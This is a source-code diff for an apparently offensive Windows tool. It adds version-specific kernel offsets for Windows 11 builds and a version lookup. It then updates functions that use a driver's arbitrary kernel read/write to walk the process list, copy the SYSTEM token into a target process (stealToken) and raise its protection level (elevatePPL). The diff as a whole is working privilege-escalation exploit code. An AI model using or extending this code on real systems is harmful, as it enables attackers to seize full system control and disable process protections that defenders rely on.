@@ -4,6 +4,74 @@
 #include "myIO.hpp"
 #include "NT_Definitions.h"
 
+#include <cassert>
+#include <iomanip>
+#include <iostream>
+#include <vector>
+#include <Windows.h>
+#include <string>
+#include <map>
+#include <stdexcept>
+
+std::map < std::string, offsets> Offsets_Dict = {
+    {
+        "10.0.26100.8875",
+        offsets{ // 26200.8875
+            0xfc6af0,  // PsInitialSystemProcess WIN11 25H2 (ntoskrnl.exe base address - PsInitialSystemProcess address |=| ? nt!PsInitialSystemProcess - nt) 
+            0x248, // Token,
+            0x1d0, // UniqueProcessId,
+            0x1d8, // ActiveProcessLinks
+            0x5fa  // PS_Protection
+        }
+    },
+    
+    {
+        "10.0.26100.9711", 
+        offsets{ // 26200.9711
+            0xFC6ab0,  // PsInitialSystemProcess WIN11 25H2 (ntoskrnl.exe base address - PsInitialSystemProcess address |=| ? nt!PsInitialSystemProcess - nt) 
+            0x248, // Token,
+            0x1d0, // UniqueProcessId,
+            0x1d8, // ActiveProcessLinks
+            0x5fa  // PS_Protection
+        }
+    }
+};
+offsets current_offsets{};
+
+bool getVersion(std::string& version) { // to change into NTAPI
+#pragma comment(lib, "version.lib")
+
+    const auto system = L"kernel32.dll";
+    DWORD dummy;
+    const auto cbInfo =
+        ::GetFileVersionInfoSizeExW(FILE_VER_GET_NEUTRAL, system, &dummy);
+    std::vector<char> buffer(cbInfo);
+    ::GetFileVersionInfoExW(FILE_VER_GET_NEUTRAL, system, dummy,
+        buffer.size(), &buffer[0]);
+    void* p = nullptr;
+    UINT size = 0;
+    ::VerQueryValueW(buffer.data(), L"\\", &p, &size);
+    assert(size >= sizeof(VS_FIXEDFILEINFO));
+    assert(p != nullptr);
+    const VS_FIXEDFILEINFO* pFixed = static_cast<const VS_FIXEDFILEINFO*>(p);
+    //std::cout << HIWORD(pFixed->dwFileVersionMS) << '.'
+    //    << LOWORD(pFixed->dwFileVersionMS) << '.'
+    //    << HIWORD(pFixed->dwFileVersionLS) << '.'
+    //    << LOWORD(pFixed->dwFileVersionLS) << '\n';
+
+    version += std::to_string(HIWORD(pFixed->dwFileVersionMS)) + '.';
+    version += std::to_string(LOWORD(pFixed->dwFileVersionMS)) + '.';
+    version += std::to_string(HIWORD(pFixed->dwFileVersionLS)) + '.';
+    version += std::to_string(LOWORD(pFixed->dwFileVersionLS));
+
+    auto it = Offsets_Dict.find(version);
+    if (it == Offsets_Dict.end()) {     
+        return false;
+    }
+    current_offsets = it->second;
+    return true;
+}
+
 bool EnablePrivilege(PCWSTR name)
 {
     HANDLE hToken;
@@ -32,14 +100,14 @@ int getEPROCESSES(_In_ DriverOps* driver, _Out_ DWORD64* systemProcess, _Out_ DW
     KernelReadWrite krw = { 0 };
 
     DWORD64 currentProcess = 0;
-    krw.src = (LPVOID)((ULONG64)ImageBase + g_offsets.PsInitialSystemProcess);
+    krw.src = (LPVOID)((ULONG64)ImageBase + current_offsets.PsInitialSystemProcess);
     krw.dst = (LPVOID)(&currentProcess);
     krw.size = sizeof(DWORD64);
     if (!driver->arbitraryRW(&krw)) {
         return 3;
     }
 
-    DWORD64 currentProcessListAddress = currentProcess + g_offsets.ActiveProcessLinks;
+    DWORD64 currentProcessListAddress = currentProcess + current_offsets.ActiveProcessLinks;
     DWORD64 HeadListAddress = currentProcessListAddress;
 
     int safety_couter = 0;
@@ -49,7 +117,7 @@ int getEPROCESSES(_In_ DriverOps* driver, _Out_ DWORD64* systemProcess, _Out_ DW
     while (1)
     {
         ULONG64 PID = 0;
-        krw.src = (LPVOID)(currentProcess + g_offsets.UniqueProcessId);
+        krw.src = (LPVOID)(currentProcess + current_offsets.UniqueProcessId);
         krw.dst = (LPVOID)(&PID);
         krw.size = sizeof(ULONG64);
         if (!driver->arbitraryRW(&krw)) {
@@ -75,7 +143,7 @@ int getEPROCESSES(_In_ DriverOps* driver, _Out_ DWORD64* systemProcess, _Out_ DW
         }
 
         DWORD64 nextAPLAddress = (DWORD64)activeProcessLinks.Flink;
-        DWORD64 nextProcess = nextAPLAddress - g_offsets.ActiveProcessLinks;
+        DWORD64 nextProcess = nextAPLAddress - current_offsets.ActiveProcessLinks;
 
         currentProcess = nextProcess;
         currentProcessListAddress = nextAPLAddress;
@@ -97,8 +165,8 @@ void printLPVOIDValue(LPVOID s)
 bool stealToken(_In_ DriverOps* driver, _In_ DWORD64 systemProcess, _In_ DWORD64 targetProcess)
 {
     KernelReadWrite krw = { 0 };
-    krw.src = (LPVOID)(systemProcess + g_offsets.Token);
-    krw.dst = (LPVOID)(targetProcess + g_offsets.Token);
+    krw.src = (LPVOID)(systemProcess + current_offsets.Token);
+    krw.dst = (LPVOID)(targetProcess + current_offsets.Token);
     krw.size = sizeof(_EX_FAST_REF);
 
     /* DEBUG
@@ -157,7 +225,7 @@ bool elevatePPL(_In_ DriverOps* driver, _In_ DWORD64 targetProcess)
     KernelReadWrite krw_2 = { 0 };
     struct _PS_PROTECTION Val_2 {};
     Val_2.Level = 0x61;
-    krw_2.dst = (LPVOID)(targetProcess + g_offsets.PS_PROTECTION);
+    krw_2.dst = (LPVOID)(targetProcess + current_offsets.PS_PROTECTION);
     krw_2.src = (LPVOID)(&Val_2);
     krw_2.size = sizeof(struct _PS_PROTECTION);
     driver->arbitraryRW(&krw_2);
